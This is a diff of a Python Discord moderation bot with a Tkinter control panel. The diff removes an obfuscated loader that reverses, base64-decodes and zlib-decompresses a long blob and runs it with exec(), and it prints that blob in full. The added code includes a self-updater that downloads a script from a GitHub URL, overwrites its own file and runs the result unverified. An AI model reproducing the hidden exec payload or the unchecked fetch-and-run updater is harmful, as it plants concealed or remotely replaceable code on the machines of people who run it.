@@ -1,2 +1,470 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'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'))
+import discord
+from discord.ext import commands
+import asyncio
+from datetime import timedelta
+import threading
+import tkinter as tk
+import sys
+import os
+import urllib.request
+import subprocess
+from pathlib import Path
+
+VERSION    = "1.0"
+UPDATE_URL = "https://raw.githubusercontent.com/palexx7106-commits/bot.py/refs/heads/main/bot.py%202.0"
+
+def check_for_update():
+    try:
+        req = urllib.request.Request(
+            UPDATE_URL,
+            headers={"Cache-Control": "no-cache", "User-Agent": "Mozilla/5.0"}
+        )
+        with urllib.request.urlopen(req, timeout=10) as r:
+            content = r.read().decode("utf-8")
+
+        remote_version = None
+        for line in content.splitlines():
+            stripped = line.strip()
+            if stripped.startswith("VERSION") and "=" in stripped:
+                try:
+                    remote_version = stripped.split("=")[1].strip().strip('"').strip("'")
+                except Exception:
+                    pass
+                break
+
+        if remote_version and remote_version != VERSION:
+            script_path = os.path.abspath(sys.argv[0])
+            with open(script_path, "w", encoding="utf-8") as f:
+                f.write(content)
+            flags = 0
+            if hasattr(subprocess, "CREATE_NEW_CONSOLE") and sys.platform == "win32":
+                flags = subprocess.CREATE_NEW_CONSOLE
+            subprocess.Popen([sys.executable, script_path], creationflags=flags)
+            sys.exit(0)
+
+    except Exception:
+        pass
+
+check_for_update()
+
+_token_file = Path.home() / "Downloads" / "token discrod thing"
+try:
+    TOKEN = _token_file.read_text(encoding="utf-8").strip()
+except FileNotFoundError:
+    import tkinter.messagebox as _mb
+    _mb.showerror("error", f"token file not found:\n{_token_file}\n\ncreate a file called \'token discrod thing\' in your Downloads folder and paste your bot token in it")
+    sys.exit(1)
+AUTO_ROLE = "tag"
+
+ICON_PATH = None
+candidate = Path.home() / "Downloads" / "asdasdfsdf.png"
+if candidate.exists():
+    ICON_PATH = str(candidate)
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="\x00", intents=intents, help_command=None)
+loop = None
+
+@bot.event
+async def on_member_join(member):
+    role = discord.utils.get(member.guild.roles, name=AUTO_ROLE)
+    if role:
+        try:
+            await member.add_roles(role)
+        except Exception:
+            pass
+
+@bot.event
+async def on_ready():
+    log(f"online van ez a geci bot AKA {bot.user}", color="green")
+    set_status(True)
+
+def log(msg, color=None):
+    try:
+        output.config(state="normal")
+        tag = color or "white"
+        output.insert("end", msg + "\n", tag)
+        output.see("end")
+        output.config(state="disabled")
+    except Exception:
+        pass
+
+def set_status(online: bool):
+    try:
+        if online:
+            status_dot.config(bg="#57f287")
+            status_lbl.config(text="online")
+        else:
+            status_dot.config(bg="#ed4245")
+            status_lbl.config(text="offline")
+    except Exception:
+        pass
+
+def get_guild():
+    return bot.guilds[0] if bot.guilds else None
+
+def run_async(coro):
+    if loop and loop.is_running():
+        asyncio.run_coroutine_threadsafe(coro, loop)
+    else:
+        log("error", "red")
+
+async def do_ban(user_id):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    try:
+        await guild.ban(discord.Object(id=user_id), delete_message_days=0)
+        log("working", "green")
+    except discord.Forbidden:
+        log("error - bot missing permissions", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+async def do_unban(user_id):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    try:
+        await guild.unban(discord.Object(id=user_id))
+        log("working", "green")
+    except discord.Forbidden:
+        log("error - bot missing permissions", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+async def do_kick(user_id):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    try:
+        member = await guild.fetch_member(user_id)
+        await member.kick()
+        log("working", "green")
+    except discord.Forbidden:
+        log("error - bot missing permissions", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+async def do_mute(user_id, seconds):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    try:
+        member = await guild.fetch_member(user_id)
+        duration = discord.utils.utcnow() + timedelta(seconds=seconds)
+        await member.timeout(duration)
+        log("working", "green")
+    except discord.Forbidden:
+        log("error - bot missing permissions", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+async def do_unmute(user_id):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    try:
+        member = await guild.fetch_member(user_id)
+        await member.timeout(None)
+        log("working", "green")
+    except discord.Forbidden:
+        log("error - bot missing permissions", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+async def do_giverole(user_id, role_id):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    try:
+        member = await guild.fetch_member(user_id)
+        role = guild.get_role(role_id)
+        if role is None:
+            log("error - role id not found", "red"); return
+        await member.add_roles(role)
+        log("working", "green")
+    except discord.Forbidden:
+        log("error - bot missing permissions", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+async def do_roleall(role_id):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    role = guild.get_role(role_id)
+    if role is None:
+        log("error - role id not found", "red"); return
+    log("working on it...", "white")
+    for member in guild.members:
+        if role not in member.roles:
+            try:
+                await member.add_roles(role)
+                await asyncio.sleep(0.5)
+            except Exception:
+                pass
+    log("working", "green")
+
+async def do_tagall(message):
+    guild = get_guild()
+    if not guild:
+        log("error", "red"); return
+    for ch in guild.text_channels:
+        try:
+            text = f"@everyone {message}" if message else "@everyone"
+            await ch.send(text, allowed_mentions=discord.AllowedMentions(everyone=True))
+            log("working", "green")
+            return
+        except Exception:
+            continue
+    log("error", "red")
+
+def get_id():
+    val = id_entry.get().strip()
+    try:
+        return int(val)
+    except ValueError:
+        log("error - invalid user id", "red")
+        return None
+
+def get_role_id():
+    val = role_entry.get().strip()
+    try:
+        return int(val)
+    except ValueError:
+        log("error - invalid role id", "red")
+        return None
+
+def btn_ban():
+    uid = get_id()
+    if uid: run_async(do_ban(uid))
+
+def btn_unban():
+    uid = get_id()
+    if uid: run_async(do_unban(uid))
+
+def btn_kick():
+    uid = get_id()
+    if uid: run_async(do_kick(uid))
+
+def btn_mute():
+    uid = get_id()
+    if not uid: return
+    try: secs = int(mins_entry.get().strip() or "60")
+    except ValueError: secs = 60
+    run_async(do_mute(uid, secs))
+
+def btn_unmute():
+    uid = get_id()
+    if uid: run_async(do_unmute(uid))
+
+def btn_giverole():
+    uid = get_id()
+    rid = get_role_id()
+    if uid and rid: run_async(do_giverole(uid, rid))
+
+def btn_roleall():
+    rid = get_role_id()
+    if rid: run_async(do_roleall(rid))
+
+def btn_tagall():
+    run_async(do_tagall(tagmsg_entry.get().strip()))
+
+def start_bot():
+    global loop
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        loop.run_until_complete(bot.start(TOKEN))
+    except discord.LoginFailure:
+        log("error - wrong token", "red")
+    except Exception as e:
+        log(f"error - {e}", "red")
+
+BG      = "#0f1117"
+BG2     = "#16181f"
+BG3     = "#1e2029"
+BG4     = "#252830"
+FG      = "#f0f2f5"
+FG2     = "#7c8494"
+FG3     = "#454d5e"
+ACCENT  = "#5865f2"
+ACCENT2 = "#4752c4"
+RED     = "#f04747"
+RED2    = "#c73e3e"
+GREEN   = "#43b581"
+GREEN2  = "#359469"
+YELLOW  = "#faa61a"
+YELLOW2 = "#d4890d"
+ENTRY_BG= "#0a0c11"
+BORDER  = "#2a2d38"
+
+root = tk.Tk()
+root.title("mod bot")
+root.resizable(False, False)
+root.configure(bg=BG)
+root.geometry("620x720")
+
+if ICON_PATH:
+    try:
+        icon = tk.PhotoImage(file=ICON_PATH)
+        root.iconphoto(True, icon)
+    except Exception:
+        pass
+
+F_LABEL  = ("Segoe UI", 9)
+F_BOLD   = ("Segoe UI", 9, "bold")
+F_TITLE  = ("Segoe UI", 15, "bold")
+F_SUB    = ("Segoe UI", 8)
+F_CAPS   = ("Segoe UI", 7, "bold")
+F_MONO   = ("Consolas", 9)
+
+def card(parent, pady=(0,8)):
+    f = tk.Frame(parent, bg=BG2, highlightthickness=1, highlightbackground=BORDER)
+    f.pack(fill="x", padx=16, pady=pady)
+    return f
+
+def section(parent, title, pady=(0,8)):
+    c = card(parent, pady)
+    tk.Label(c, text=title.upper(), bg=BG2, fg=FG2, font=F_CAPS).pack(anchor="w", padx=14, pady=(10,6))
+    sep = tk.Frame(c, bg=BORDER, height=1)
+    sep.pack(fill="x", padx=14)
+    inner = tk.Frame(c, bg=BG2)
+    inner.pack(fill="x", padx=14, pady=(10,14))
+    return inner
+
+def lbl(parent, text):
+    return tk.Label(parent, text=text, bg=BG2, fg=FG2, font=F_SUB)
+
+def inp(parent, width=20):
+    f = tk.Frame(parent, bg=BORDER, padx=1, pady=1)
+    e = tk.Entry(f, bg=ENTRY_BG, fg=FG, insertbackground=FG,
+                 relief="flat", font=("Segoe UI", 10), width=width,
+                 bd=4)
+    e.pack()
+    e.bind("<FocusIn>",  lambda ev: f.config(bg=ACCENT))
+    e.bind("<FocusOut>", lambda ev: f.config(bg=BORDER))
+    return f, e
+
+def raw_inp(parent, width=20):
+    frame, entry = inp(parent, width)
+    return frame, entry
+
+def btn(parent, text, cmd, color=ACCENT, hover=ACCENT2, width=None):
+    kw = {}
+    if width: kw["width"] = width
+    b = tk.Button(parent, text=text, command=cmd,
+                  bg=color, fg=FG, relief="flat", cursor="hand2",
+                  font=F_BOLD, activebackground=hover,
+                  activeforeground=FG, padx=14, pady=8, bd=0, **kw)
+    b.bind("<Enter>", lambda e: b.config(bg=hover))
+    b.bind("<Leave>", lambda e: b.config(bg=color))
+    return b
+
+def btn_red(parent, text, cmd, **kw):
+    return btn(parent, text, cmd, RED, RED2, **kw)
+
+def btn_yellow(parent, text, cmd, **kw):
+    return btn(parent, text, cmd, YELLOW, YELLOW2, **kw)
+
+def btn_green(parent, text, cmd, **kw):
+    return btn(parent, text, cmd, GREEN, GREEN2, **kw)
+
+outer = tk.Frame(root, bg=BG)
+outer.pack(fill="both", expand=True)
+
+canvas = tk.Canvas(outer, bg=BG, highlightthickness=0, bd=0)
+scrollbar = tk.Scrollbar(outer, orient="vertical", command=canvas.yview)
+canvas.configure(yscrollcommand=scrollbar.set)
+scrollbar.pack(side="right", fill="y")
+canvas.pack(side="left", fill="both", expand=True)
+
+inner_frame = tk.Frame(canvas, bg=BG)
+canvas_window = canvas.create_window((0,0), window=inner_frame, anchor="nw")
+
+def on_frame_configure(e):
+    canvas.configure(scrollregion=canvas.bbox("all"))
+
+def on_canvas_configure(e):
+    canvas.itemconfig(canvas_window, width=e.width)
+
+inner_frame.bind("<Configure>", on_frame_configure)
+canvas.bind("<Configure>", on_canvas_configure)
+
+def _on_mousewheel(e):
+    canvas.yview_scroll(int(-1*(e.delta/120)), "units")
+canvas.bind_all("<MouseWheel>", _on_mousewheel)
+
+head_card = tk.Frame(inner_frame, bg=BG3, highlightthickness=1, highlightbackground=BORDER)
+head_card.pack(fill="x", padx=16, pady=(16,8))
+
+head_inner = tk.Frame(head_card, bg=BG3)
+head_inner.pack(fill="x", padx=16, pady=14)
+
+left = tk.Frame(head_inner, bg=BG3)
+left.pack(side="left")
+tk.Label(left, text="discord mod bot", bg=BG3, fg=FG, font=F_TITLE).pack(anchor="w")
+tk.Label(left, text="moderation panel", bg=BG3, fg=FG2, font=F_SUB).pack(anchor="w")
+
+right = tk.Frame(head_inner, bg=BG3)
+right.pack(side="right", anchor="e")
+status_dot = tk.Label(right, text="●", bg=BG3, fg=RED, font=("Segoe UI", 14))
+status_dot.pack(side="left")
+status_lbl = tk.Label(right, text="offline", bg=BG3, fg=FG2, font=F_SUB)
+status_lbl.pack(side="left", padx=(4,0))
+
+s1 = section(inner_frame, "user idjat ted ide es jah")
+lbl(s1, "user idja").pack(anchor="w", pady=(0,4))
+id_frame, id_entry = raw_inp(s1, 38)
+id_frame.pack(anchor="w")
+
+s2 = section(inner_frame, "mute ize")
